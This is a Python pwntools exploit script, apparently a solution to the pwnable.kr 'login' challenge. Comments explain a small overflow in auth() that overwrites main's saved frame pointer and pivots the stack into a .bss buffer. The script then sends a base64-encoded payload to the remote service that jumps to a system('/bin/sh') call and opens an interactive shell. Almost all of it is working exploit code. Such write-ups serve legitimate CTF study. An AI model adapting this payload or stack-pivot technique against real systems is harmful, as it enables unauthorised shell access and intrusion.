from pwn import *

'''
int main(){
  ...
  v6 = Base64Decode(&s, &v4);                   // v6 is the length of the decoded string. v4 is the addr of the decoded string.
  if ( v6 > 0xC )                               // The length of decoded string must be less than or equal to 0xC
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v4, v6);                     // Store the decoded string in a varable input in .bss
    if ( auth(v6) == 1 )
      correct();
  }
  ...
}

bool auth(a1){
  memcpy(&v4, &input, a1);                      // a1 <= 12, len(v4) = 4.
  s2 = (char *)calc_md5(&v2, 12);
  printf("hash : %s\n", (char)s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}

v4 = ebp - 0x8h
a1 = 12
a1 - v4 = 0x4
so overflow will overwrite ebp of main()

Oveflow in auth():
             +-------------+
             |  main_retn  |
    ebp -->  +-------------+
             |  callee_ebp |  <--- input_bss
             +-------------+
             |             |  <--- system_addr
ebp-0x8 -->  +-------------+
             |     v4      |  <--- padding * 4
             +-------------+

At the end of auth()
# leave = mov esp, ebp; pop ebp     // ebp_main = input_bss
# retn = pop eip

At the end of main():
# leave = mov esp, ebp; pop ebp     // esp_main = ebp_main = input_bss; input_bss = system_addr; padding*4; then execute the esp
# retn = pop eip
'''

p = remote('pwnable.kr', 9003)
p.recvuntil('Authenticate : ')

input_bss = 0x0811EB40
system_addr = 0x08049278       # 0x08049278 - 0x08049284
# .text:08049278                 mov     dword ptr [esp], offset aCongratulation ; "Congratulation! you are good!"
# .text:0804927F                 call    puts
# .text:08049284                 mov     dword ptr [esp], offset aBinSh ; "/bin/sh"               ; write shell into esp, esp should be write permitted
# .text:0804928B                 call    system

payload = 'A' * 4
payload += p32(system_addr)
payload += p32(input_bss)
# print b64e(payload)          # QUFBQXiSBAhA6xEI
# gdb attach <pid>

p.sendline(b64e(payload))
p.recvline()
p.interactive()